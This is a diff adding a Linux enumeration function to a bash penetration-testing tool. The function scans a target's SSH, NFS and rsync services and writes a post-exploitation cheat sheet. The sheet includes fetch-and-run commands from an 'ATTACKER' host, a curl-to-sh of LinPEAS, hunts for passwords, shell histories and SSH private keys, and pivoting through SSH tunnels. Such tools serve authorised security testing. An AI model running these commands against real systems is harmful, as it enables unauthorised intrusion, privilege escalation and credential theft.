@@ -797,7 +797,136 @@ EOF
 }
 
 linux_enum() {
-    echo -e "${YELLOW}[+] Work in progress - Linux enumeration not yet implemented${NO_COLOR}"
+    local timeout="${1:-300}"
+    local dry_run="${2:-}"
+
+    if [[ "$dry_run" == "--dry-run" ]]; then
+        echo -e "${YELLOW}[+] Would run linux_enum on $IP${NO_COLOR}"
+        return 0
+    fi
+
+    echo -e "${GREEN}[+] Starting Linux enumeration...${NO_COLOR}"
+    mkdir -p "$loot/linux"
+
+    # === Validate: require linux_found tag OR SSH port present in any scan ===
+    local linux_confirmed=0
+    [[ -s "$loot/raw/linux_found" ]] && linux_confirmed=1
+
+    if (( linux_confirmed == 0 )); then
+        local svc_file
+        for svc_file in \
+            "$IP/autoenum/reg_scan/ports_and_services/services_running" \
+            "$IP/autoenum/aggr_scan/ports_and_services/services_running" \
+            "$IP/autoenum/top_1k/ports_and_services/services" \
+            "$IP/autoenum/top_10k/ports_and_services/services"; do
+            [[ ! -s "$svc_file" ]] && continue
+            if grep -qE "^22/|^2222/" "$svc_file" 2>/dev/null; then
+                linux_confirmed=1
+            fi
+            break
+        done
+    fi
+
+    if (( linux_confirmed == 0 )); then
+        echo -e "${YELLOW}[-] Linux not confirmed — no linux_found tag and SSH not detected.${NO_COLOR}"
+        echo -e "${YELLOW}[-] Skipping linux_enum.${NO_COLOR}"
+        return 0
+    fi
+    echo -e "${GREEN}[+] Linux target confirmed — proceeding${NO_COLOR}"
+
+    # === SSH enumeration ===
+    (
+        echo -e "${YELLOW}[+] Running SSH enumeration scripts${NO_COLOR}"
+        timeout "$timeout" nmap -p 22,2222 -sV \
+            --script "ssh-auth-methods,ssh-hostkey,ssh2-enum-algos" \
+            "$IP" | tee "$loot/linux/nmap_ssh" 2>/dev/null || {
+            echo -e "${RED}[-] nmap SSH scripts failed${NO_COLOR}"
+        }
+        echo "nmap -p 22,2222 -sV --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos $IP" >> "$loot/linux/cmds_run"
+    ) &
+
+    # === NFS enumeration ===
+    (
+        echo -e "${YELLOW}[+] Checking for NFS exports${NO_COLOR}"
+        timeout 30 showmount -e "$IP" 2>/dev/null \
+            | tee "$loot/linux/nfs_showmount" 2>/dev/null || {
+            echo -e "${YELLOW}[-] showmount failed (NFS may not be exposed)${NO_COLOR}"
+        }
+        echo "showmount -e $IP" >> "$loot/linux/cmds_run"
+
+        timeout "$timeout" nmap -p 111,2049 -sV \
+            --script "nfs-ls,nfs-statfs,nfs-showmount,rpcinfo" \
+            "$IP" | tee "$loot/linux/nmap_nfs" 2>/dev/null || {
+            echo -e "${RED}[-] nmap NFS scripts failed${NO_COLOR}"
+        }
+        echo "nmap -p 111,2049 -sV --script nfs-ls,nfs-statfs,nfs-showmount,rpcinfo $IP" >> "$loot/linux/cmds_run"
+    ) &
+
+    # === Rsync anonymous module listing ===
+    (
+        echo -e "${YELLOW}[+] Checking for Rsync anonymous access${NO_COLOR}"
+        timeout 15 rsync --list-only rsync://"$IP"/ 2>/dev/null \
+            | tee "$loot/linux/rsync_modules" 2>/dev/null || {
+            echo -e "${YELLOW}[-] rsync anonymous listing failed (service may not be running)${NO_COLOR}"
+        }
+        echo "rsync --list-only rsync://$IP/" >> "$loot/linux/cmds_run"
+
+        timeout "$timeout" nmap -p 873 --script rsync-list-modules \
+            "$IP" | tee "$loot/linux/nmap_rsync" 2>/dev/null || {
+            echo -e "${RED}[-] nmap rsync scripts failed${NO_COLOR}"
+        }
+        echo "nmap -p 873 --script rsync-list-modules $IP" >> "$loot/linux/cmds_run"
+    ) &
+
+    wait
+
+    # === Clean up empty output files ===
+    find "$loot/linux" -type f ! -name "cmds_run" -empty -delete 2>/dev/null
+
+    # === Post-exploitation manual commands ===
+    cat > "$loot/linux/post_exploitation_cmds" << 'EOF'
+# ===== POST-EXPLOITATION: Linux =====
+# Run these once you have initial access
+
+# --- Privilege Escalation ---
+# LinPEAS (upload and run):
+#   curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+#   wget http://ATTACKER/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
+# Linux Exploit Suggester:
+#   wget http://ATTACKER/linux-exploit-suggester.sh -O /tmp/les.sh && bash /tmp/les.sh
+# SUID/SGID binaries:
+#   find / -perm -4000 -type f 2>/dev/null
+#   find / -perm -2000 -type f 2>/dev/null
+# World-writable files:
+#   find / -writable -type f ! -path "/proc/*" 2>/dev/null
+# Cron jobs:
+#   cat /etc/cron* /etc/crontab /var/spool/cron/crontabs/* 2>/dev/null
+#   ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
+
+# --- Credential Hunting ---
+#   grep -r "password\|passwd\|secret\|key" /home /var/www /etc 2>/dev/null | grep -v Binary
+#   find / -name "*.conf" -o -name "*.env" -o -name ".env" 2>/dev/null | xargs grep -l "pass" 2>/dev/null
+#   cat ~/.bash_history ~/.zsh_history ~/.mysql_history 2>/dev/null
+#   find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
+
+# --- NFS Mounts ---
+#   showmount -e TARGET_IP          # list exports from attacker
+#   mount -t nfs TARGET_IP:/export /mnt/nfs -o nolock
+
+# --- Rsync ---
+#   rsync --list-only rsync://TARGET_IP/         # list modules
+#   rsync -av rsync://TARGET_IP/MODULE /loot/    # download a module
+
+# --- Lateral Movement ---
+#   ssh -i id_rsa USER@TARGET_IP
+#   ssh USER@TARGET_IP -L 8080:127.0.0.1:8080   # local port forward
+#   ssh USER@TARGET_IP -D 1080                   # SOCKS proxy
+EOF
+
+    rm -f "$loot/raw/linux_found"
+    echo -e "${GREEN}[+] Linux enumeration complete!${NO_COLOR}"
+    echo -e "${CYAN}[+] Results saved to: $loot/linux/${NO_COLOR}"
+    echo -e "${CYAN}[+] Post-exploitation commands: $loot/linux/post_exploitation_cmds${NO_COLOR}"
 }
 
 windows_enum() {
